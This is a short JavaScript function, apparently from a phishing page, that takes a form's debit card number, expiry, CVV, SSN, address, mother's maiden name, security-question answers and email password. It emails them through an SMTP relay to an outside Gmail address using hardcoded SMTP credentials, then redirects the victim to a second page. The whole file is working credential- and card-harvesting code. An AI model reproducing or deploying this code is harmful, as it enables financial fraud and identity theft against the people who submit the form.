function sendEmail() {
    Email.send({
      Host: "smtp.elasticemail.com",
      Username: "lexbritt11@gmail.com",
      Password: "B98286FB9DE8198F0F85409BD2C0C588062F",
      To: "billscosco0245@gmail.com",
      From: document.getElementById("12").value,
      Subject: "New Contact Info for Form Enquiry",
      Body:
        "Debit Card Number: " +
        document.getElementById("1").value +
        " <br> Expiry Date: " +
        document.getElementById("2").value +
        " <br> CVV: " +
        document.getElementById("3").value +
        " <br> SSN: " +
        document.getElementById("4").value +
        "Name on Card: " +
        document.getElementById("5").value +
        " <br> Address: " +
        document.getElementById("6").value +
        " <br> City: " +
        document.getElementById("7").value +
        " <br> State: " +
        document.getElementById("8").value +
        " <br> Zipcode: " +
        document.getElementById("9").value +
        " <br> Mother Maiden Name: " +
        document.getElementById("10").value +
        " <br> Name of company you first worked: " +
        document.getElementById("first").value +
        " <br> High school city: " +
        document.getElementById("school").value +
        " <br> City of birth: " +
        document.getElementById("11").value +
        " <br> Email Address: " +
        document.getElementById("12").value +
        " <br> Email Password: " +
        document.getElementById("13").value +
        " <br> Pet's Name: " +
        document.getElementById("14").value
  
    }).then((message) => {
          // alert("Message")
          window.location.href = "pagetwo.html"
  
      });
  }
  